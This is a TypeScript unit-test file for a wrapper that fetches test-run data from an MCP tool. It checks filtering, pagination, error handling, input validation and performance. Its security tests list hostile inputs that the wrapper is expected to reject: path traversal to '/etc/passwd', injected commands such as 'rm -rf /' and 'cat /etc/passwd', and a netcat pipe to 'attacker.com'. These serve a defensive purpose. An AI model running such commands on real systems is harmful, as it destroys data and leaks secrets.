/**
 * Unit Tests for getRuns Wrapper
 *
 * Tests wrapper logic in isolation using mocked MCP client.
 * Validates filtering, token reduction, pagination, schema validation, and error handling.
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import {
  createMCPMock,
  testSecurityScenarios,
  getAllSecurityScenarios,
  MCPErrors,
} from '@claude/testing';

// Mock the MCP client module BEFORE importing
vi.mock('../config/lib/mcp-client', () => ({
  callMCPTool: vi.fn(),
}));

// Import the wrapper to test
import { getRuns } from './get-runs';

// Import MCP client for type access
import * as mcpClient from '../config/lib/mcp-client';

describe('getRuns - Unit Tests', () => {
  let mcpMock: ReturnType<typeof createMCPMock>;

  beforeEach(() => {
    // Create fresh mock for each test
    mcpMock = createMCPMock();
    vi.mocked(mcpClient.callMCPTool).mockImplementation(mcpMock);
  });

  afterEach(() => {
    // Clear mocks after each test
    vi.clearAllMocks();
  });

  // ==========================================================================
  // Category 1: Wrapper Logic Tests (Mocked)
  // ==========================================================================

  describe('Filtering logic', () => {
    it('should filter response correctly', async () => {
      // Arrange: Mock MCP response with multiple runs - actual API structure with nested groups
      const mockRuns = [
        {
          runId: 'run-1',
          status: 'PASSED',
          completionState: 'COMPLETE',
          createdAt: '2024-01-01T00:00:00Z',
          durationMs: 120000,
          timeout: { isTimeout: false },
          groups: [{
            instances: { overall: 10, complete: 10, passes: 10, failures: 0 },
            tests: { overall: 50, passes: 50, failures: 0, pending: 0, flaky: 0 }
          }],
          tags: [],
          meta: { ciBuildId: 'build-1', commit: { branch: 'main', sha: 'abc123' } },
        },
        {
          runId: 'run-2',
          status: 'RUNNING',
          completionState: 'COMPLETE',
          createdAt: '2024-01-02T00:00:00Z',
          durationMs: 60000,
          timeout: { isTimeout: false },
          groups: [{
            instances: { overall: 5, complete: 5, passes: 5, failures: 0 },
            tests: { overall: 25, passes: 25, failures: 0, pending: 0, flaky: 0 }
          }],
          tags: [],
          meta: {},
        },
      ];

      mcpMock.mockResolvedValue({ data: mockRuns, has_more: true });

      // Act
      const result = await getRuns.execute({ projectId: 'project-123' });

      // Assert
      expect(result).toBeDefined();
      expect(result.runs).toHaveLength(2);
      expect(result.totalRuns).toBe(2);
      expect(result.hasMore).toBe(true);
      expect(result.estimatedTokens).toBeGreaterThan(0);

      // Verify filtered runs have aggregated stats
      expect(result.runs[0].id).toBe('run-1');
      expect(result.runs[0].status).toBe('PASSED');
      expect(result.runs[0].specs.total).toBe(10);
      expect(result.runs[0].tests.total).toBe(50);
      expect(result.runs[0]).not.toHaveProperty('groups');
      expect(result.runs[0]).not.toHaveProperty('timeout');

      // Verify MCP client called correctly
      expect(mcpMock).toHaveBeenCalledTimes(1);
      expect(mcpMock).toHaveBeenCalledWith('currents', 'currents-get-runs', {
        projectId: 'project-123',
        limit: 50, // default
      });
    });

    it('should handle empty runs array', async () => {
      // Arrange
      mcpMock.mockResolvedValue({ data: [] });

      // Act
      const result = await getRuns.execute({ projectId: 'project-empty' });

      // Assert
      expect(result.runs).toEqual([]);
      expect(result.totalRuns).toBe(0);
      expect(result.hasMore).toBe(false);
      expect(result.estimatedTokens).toBe(1); // Empty array "[]" = 2 chars = 1 token
    });

    it('should handle missing runs field', async () => {
      // Arrange
      mcpMock.mockResolvedValue({});

      // Act
      const result = await getRuns.execute({ projectId: 'project-123' });

      // Assert
      expect(result.runs).toEqual([]);
      expect(result.totalRuns).toBe(0);
      expect(result.hasMore).toBe(false);
    });

    it('should respect limit parameter', async () => {
      // Arrange: Mock 100 runs but limit to 10
      const mockRuns = Array.from({ length: 100 }, (_, i) => ({
        runId: `run-${i}`,
        status: 'PASSED',
        completionState: 'COMPLETE',
        createdAt: '2024-01-01T00:00:00Z',
        durationMs: 60000,
        groups: [{
          instances: { overall: 5, complete: 5, passes: 5, failures: 0 },
          tests: { overall: 25, passes: 25, failures: 0, pending: 0, flaky: 0 }
        }],
        tags: [],
      }));

      mcpMock.mockResolvedValue({ data: mockRuns });

      // Act
      const result = await getRuns.execute({ projectId: 'project-123', limit: 10 });

      // Assert
      expect(result.runs).toHaveLength(10);
      expect(result.totalRuns).toBe(100); // Total available
      expect(result.runs[0].id).toBe('run-0');
      expect(result.runs[9].id).toBe('run-9');
    });

    it('should handle pagination with cursor', async () => {
      // Arrange
      const mockRuns = [{
        runId: 'run-1',
        status: 'PASSED',
        completionState: 'COMPLETE',
        createdAt: '2024-01-01T00:00:00Z',
        durationMs: 60000,
        groups: [{
          instances: { overall: 5, complete: 5, passes: 5, failures: 0 },
          tests: { overall: 25, passes: 25, failures: 0, pending: 0, flaky: 0 }
        }],
        tags: [],
      }];
      mcpMock.mockResolvedValue({ data: mockRuns, has_more: true });

      // Act
      const result = await getRuns.execute({
        projectId: 'project-123',
        cursor: 'page-1-token',
      });

      // Assert
      expect(result.hasMore).toBe(true);
      expect(mcpMock).toHaveBeenCalledWith('currents', 'currents-get-runs', {
        projectId: 'project-123',
        cursor: 'page-1-token',
        limit: 50,
      });
    });

    it('should handle last page (no cursor)', async () => {
      // Arrange
      mcpMock.mockResolvedValue({
        data: [{
          runId: 'run-1',
          status: 'PASSED',
          completionState: 'COMPLETE',
          createdAt: '2024-01-01T00:00:00Z',
          durationMs: 60000,
          groups: [{
            instances: { overall: 5, complete: 5, passes: 5, failures: 0 },
            tests: { overall: 25, passes: 25, failures: 0, pending: 0, flaky: 0 }
          }],
          tags: [],
        }],
        has_more: false
      });

      // Act
      const result = await getRuns.execute({ projectId: 'project-123' });

      // Assert
      expect(result.hasMore).toBe(false);
    });
  });

  describe('Token estimation', () => {
    it('should calculate token estimate correctly', async () => {
      // Arrange
      const mockRuns = [
        {
          runId: 'run-1',
          status: 'PASSED',
          completionState: 'COMPLETE',
          createdAt: '2024-01-01T00:00:00Z',
          durationMs: 120000,
          groups: [{
            instances: { overall: 10, complete: 10, passes: 10, failures: 0 },
            tests: { overall: 50, passes: 50, failures: 0, pending: 0, flaky: 0 }
          }],
          tags: [],
        },
        {
          runId: 'run-2',
          status: 'RUNNING',
          completionState: 'COMPLETE',
          createdAt: '2024-01-02T00:00:00Z',
          durationMs: 60000,
          groups: [{
            instances: { overall: 5, complete: 5, passes: 5, failures: 0 },
            tests: { overall: 25, passes: 25, failures: 0, pending: 0, flaky: 0 }
          }],
          tags: [],
        },
      ];

      mcpMock.mockResolvedValue({ data: mockRuns });

      // Act
      const result = await getRuns.execute({ projectId: 'project-123' });

      // Assert
      const expectedSize = JSON.stringify(result.runs).length;
      const expectedTokens = Math.ceil(expectedSize / 4);

      expect(result.estimatedTokens).toBe(expectedTokens);
      expect(result.estimatedTokens).toBeGreaterThan(0);
    });

    it('should calculate minimal tokens for empty list', async () => {
      // Arrange
      mcpMock.mockResolvedValue({ data: [] });

      // Act
      const result = await getRuns.execute({ projectId: 'project-123' });

      // Assert: Empty array "[]" = 2 chars = 1 token
      expect(result.estimatedTokens).toBe(1);
    });
  });

  describe('Response format handling', () => {
    it('should handle object format', async () => {
      // Arrange: Standard format
      mcpMock.mockResolvedValue({
        data: [
          {
            runId: 'run-1',
            status: 'PASSED',
            completionState: 'COMPLETE',
            createdAt: '2024-01-01T00:00:00Z',
            durationMs: 120000,
            groups: [{
              instances: { overall: 10, complete: 10, passes: 10, failures: 0 },
              tests: { overall: 50, passes: 50, failures: 0, pending: 0, flaky: 0 }
            }],
            tags: [],
          },
        ],
        has_more: true,
      });

      // Act
      const result = await getRuns.execute({ projectId: 'project-123' });

      // Assert
      expect(result.runs).toHaveLength(1);
      expect(result.hasMore).toBe(true);
    });

    it('should handle direct array format', async () => {
      // Arrange: Edge case - direct array (not the actual API format)
      const mockArray = [
        {
          runId: 'run-1',
          status: 'PASSED',
          createdAt: '2024-01-01T00:00:00Z',
          groups: [{
            instances: { overall: 5, complete: 5, passes: 5, failures: 0 },
            tests: { overall: 25, passes: 25, failures: 0, pending: 0, flaky: 0 }
          }],
          tags: [],
        },
      ];
      mcpMock.mockResolvedValue(mockArray as any);

      // Act
      const result = await getRuns.execute({ projectId: 'project-123' });

      // Assert: Should handle gracefully with defaults (expects {data: [...]} format)
      expect(result.runs).toEqual([]);
      expect(result.totalRuns).toBe(0);
    });

    it('should handle tuple format', async () => {
      // Arrange: Edge case - tuple (not the actual API format)
      const mockTuple = [{
        runId: 'run-1',
        status: 'PASSED',
        createdAt: '2024-01-01T00:00:00Z',
        groups: [{
          instances: { overall: 5, complete: 5, passes: 5, failures: 0 },
          tests: { overall: 25, passes: 25, failures: 0, pending: 0, flaky: 0 }
        }],
        tags: [],
      }];
      mcpMock.mockResolvedValue(mockTuple as any);

      // Act
      const result = await getRuns.execute({ projectId: 'project-123' });

      // Assert
      expect(result.runs).toBeDefined();
      expect(Array.isArray(result.runs)).toBe(true);
    });

    it('should handle different status values', async () => {
      // Arrange
      const statuses = ['RUNNING', 'PASSED', 'FAILED', 'CANCELLED', 'TIMEOUT'];
      const mockRuns = statuses.map((status, i) => ({
        runId: `run-${i}`,
        status,
        completionState: 'COMPLETE',
        createdAt: '2024-01-01T00:00:00Z',
        durationMs: 60000,
        groups: [{
          instances: { overall: 5, complete: 5, passes: 5, failures: 0 },
          tests: { overall: 25, passes: 25, failures: 0, pending: 0, flaky: 0 }
        }],
        tags: [],
      }));

      mcpMock.mockResolvedValue({ data: mockRuns });

      // Act
      const result = await getRuns.execute({ projectId: 'project-123' });

      // Assert
      expect(result.runs).toHaveLength(5);
      result.runs.forEach((run, i) => {
        expect(run.status).toBe(statuses[i]);
      });
    });
  });

  // ==========================================================================
  // Category 2: Error Handling Tests
  // ==========================================================================

  describe('MCP server errors', () => {
    it('should handle rate limit errors', async () => {
      // Arrange
      mcpMock.mockRejectedValue(MCPErrors.rateLimit());

      // Act & Assert
      await expect(getRuns.execute({ projectId: 'project-123' })).rejects.toThrow(/rate limit/i);
    });

    it('should handle server errors', async () => {
      // Arrange
      mcpMock.mockRejectedValue(MCPErrors.serverError());

      // Act & Assert
      await expect(getRuns.execute({ projectId: 'project-123' })).rejects.toThrow(/server.*error/i);
    });

    it('should handle network timeout', async () => {
      // Arrange
      mcpMock.mockRejectedValue(MCPErrors.timeout());

      // Act & Assert
      await expect(getRuns.execute({ projectId: 'project-123' })).rejects.toThrow(/ETIMEDOUT/);
    });

    it('should handle authentication errors', async () => {
      // Arrange
      mcpMock.mockRejectedValue(MCPErrors.unauthorized());

      // Act & Assert
      await expect(getRuns.execute({ projectId: 'project-123' })).rejects.toThrow(/authentication required/i);
    });
  });

  describe('Malformed responses', () => {
    it('should handle null response', async () => {
      // Arrange
      mcpMock.mockResolvedValue(null);

      // Act
      const result = await getRuns.execute({ projectId: 'project-123' });

      // Assert
      expect(result.runs).toEqual([]);
      expect(result.totalRuns).toBe(0);
    });

    it('should handle runs with missing fields', async () => {
      // Arrange
      mcpMock.mockResolvedValue({
        data: [
          {
            runId: 'run-1',
            status: 'PASSED',
            createdAt: '2024-01-01T00:00:00Z',
            groups: [], // No groups means no specs/tests data
          },
          {
            status: 'RUNNING',
            groups: [],
          }, // Missing runId, createdAt
        ],
      });

      // Act
      const result = await getRuns.execute({ projectId: 'project-123' });

      // Assert
      expect(result.runs).toHaveLength(2);
      expect(result.runs[0].specs.total).toBe(0); // Default from empty groups
      expect(result.runs[0].tests.total).toBe(0); // Default from empty groups
      expect(result.runs[1].id).toBe('unknown'); // Default
    });

    it('should fail on string numbers due to strict validation', async () => {
      // Arrange: API returns string numbers instead of numbers
      mcpMock.mockResolvedValue({
        data: [
          {
            runId: 'run-1',
            status: 'PASSED',
            createdAt: '2024-01-01T00:00:00Z',
            groups: [{
              instances: { overall: '10' as any, complete: 10, passes: 10, failures: 0 },
              tests: { overall: '50' as any, passes: 50, failures: 0, pending: 0, flaky: 0 }
            }],
            tags: [],
          },
        ],
      });

      // Act & Assert: Zod validation should reject string numbers
      await expect(getRuns.execute({ projectId: 'project-123' })).rejects.toThrow(/Expected number, received string/);
    });
  });

  // ==========================================================================
  // Category 3: Input Validation Tests
  // ==========================================================================

  describe('Input validation', () => {
    it('should accept valid projectId', async () => {
      // Arrange
      mcpMock.mockResolvedValue({ runs: [] });

      // Act & Assert
      await expect(getRuns.execute({ projectId: 'project-123' })).resolves.toBeDefined();
      await expect(getRuns.execute({ projectId: 'abc-def-ghi' })).resolves.toBeDefined();
      await expect(getRuns.execute({ projectId: 'PROJ_456' })).resolves.toBeDefined();
    });

    it('should reject empty projectId', async () => {
      // Act & Assert
      await expect(getRuns.execute({ projectId: '' })).rejects.toThrow();
    });

    it('should reject missing projectId', async () => {
      // Act & Assert
      await expect(getRuns.execute({} as any)).rejects.toThrow();
      await expect(getRuns.execute({ projectId: undefined as any })).rejects.toThrow();
      await expect(getRuns.execute({ projectId: null as any })).rejects.toThrow();
    });

    it('should accept valid limit values', async () => {
      // Arrange
      mcpMock.mockResolvedValue({ runs: [] });

      // Act & Assert
      await expect(getRuns.execute({ projectId: 'proj-1', limit: 1 })).resolves.toBeDefined();
      await expect(getRuns.execute({ projectId: 'proj-1', limit: 25 })).resolves.toBeDefined();
      await expect(getRuns.execute({ projectId: 'proj-1', limit: 50 })).resolves.toBeDefined();
    });

    it('should reject invalid limit values', async () => {
      // Act & Assert
      await expect(getRuns.execute({ projectId: 'proj-1', limit: 0 })).rejects.toThrow();
      await expect(getRuns.execute({ projectId: 'proj-1', limit: -5 })).rejects.toThrow();
      await expect(getRuns.execute({ projectId: 'proj-1', limit: 51 })).rejects.toThrow();
      await expect(getRuns.execute({ projectId: 'proj-1', limit: 100 })).rejects.toThrow();
      await expect(getRuns.execute({ projectId: 'proj-1', limit: 1.5 })).rejects.toThrow(); // Not integer
    });

    it('should accept optional cursor', async () => {
      // Arrange
      mcpMock.mockResolvedValue({ runs: [] });

      // Act & Assert
      await expect(getRuns.execute({ projectId: 'proj-1', cursor: 'page-token' })).resolves.toBeDefined();
      await expect(getRuns.execute({ projectId: 'proj-1' })).resolves.toBeDefined(); // No cursor
    });
  });

  // ==========================================================================
  // Category 4: Security Tests (Automated)
  // ==========================================================================

  describe('Security', () => {
    it('should reject path traversal in projectId', async () => {
      // Arrange
      const attacks = ['../../../etc/passwd', '..\\..\\..\\windows', 'proj/../admin'];

      // Act & Assert
      for (const attack of attacks) {
        await expect(getRuns.execute({ projectId: attack })).rejects.toThrow(/path traversal/i);
      }
    });

    it('should reject command injection in projectId', async () => {
      // Arrange
      const attacks = ['proj; rm -rf /', 'proj && cat /etc/passwd', 'proj | nc attacker.com'];

      // Act & Assert
      for (const attack of attacks) {
        await expect(getRuns.execute({ projectId: attack })).rejects.toThrow(/command injection/i);
      }
    });

    it('should reject control characters in projectId', async () => {
      // Arrange
      const attacks = ['proj\x00', 'proj\r\n', 'proj\x1b[31m'];

      // Act & Assert
      for (const attack of attacks) {
        await expect(getRuns.execute({ projectId: attack })).rejects.toThrow(/control characters/i);
      }
    });

    it('should reject path traversal in cursor', async () => {
      // Arrange
      const attacks = ['../../../etc/passwd', 'cursor/../admin'];

      // Act & Assert
      for (const attack of attacks) {
        await expect(getRuns.execute({ projectId: 'proj-1', cursor: attack })).rejects.toThrow(/path traversal/i);
      }
    });

    it('should accept safe special characters', async () => {
      // Arrange
      mcpMock.mockResolvedValue({ runs: [] });

      // Act & Assert
      await expect(getRuns.execute({ projectId: 'proj-123' })).resolves.toBeDefined();
      await expect(getRuns.execute({ projectId: 'proj_456' })).resolves.toBeDefined();
      await expect(getRuns.execute({ projectId: 'proj.789' })).resolves.toBeDefined();
    });
  });

  // ==========================================================================
  // Category 5: Performance Tests
  // ==========================================================================

  describe('Performance', () => {
    it('should have minimal wrapper overhead', async () => {
      // Arrange
      mcpMock.mockResolvedValue({
        data: [{
          runId: 'run-1',
          status: 'PASSED',
          completionState: 'COMPLETE',
          createdAt: '2024-01-01T00:00:00Z',
          durationMs: 60000,
          groups: [{
            instances: { overall: 5, complete: 5, passes: 5, failures: 0 },
            tests: { overall: 25, passes: 25, failures: 0, pending: 0, flaky: 0 }
          }],
          tags: [],
        }],
      });

      // Act
      const start = Date.now();
      const iterations = 100;

      for (let i = 0; i < iterations; i++) {
        await getRuns.execute({ projectId: 'project-123' });
      }

      const avgTime = (Date.now() - start) / iterations;

      // Assert
      expect(avgTime).toBeLessThan(10); // <10ms per call
      console.log(`Average execution time: ${avgTime.toFixed(2)}ms per call`);
    });

    it('should handle filtering large datasets efficiently', async () => {
      // Arrange
      const mockRuns = Array.from({ length: 1000 }, (_, i) => ({
        runId: `run-${i}`,
        status: 'PASSED',
        completionState: 'COMPLETE',
        createdAt: '2024-01-01T00:00:00Z',
        durationMs: 120000,
        groups: [{
          instances: { overall: 10, complete: 10, passes: 10, failures: 0 },
          tests: { overall: 50, passes: 50, failures: 0, pending: 0, flaky: 0 }
        }],
        tags: [],
        meta: { foo: 'bar' },
      }));

      mcpMock.mockResolvedValue({ data: mockRuns });

      // Act
      const start = Date.now();
      const result = await getRuns.execute({ projectId: 'project-123', limit: 50 });
      const filterTime = Date.now() - start;

      // Assert
      expect(result.runs).toHaveLength(50);
      expect(result.totalRuns).toBe(1000);
      expect(filterTime).toBeLessThan(50); // <50ms for large dataset
      console.log(`Filter time for 1000 runs: ${filterTime}ms`);
    });
  });
});
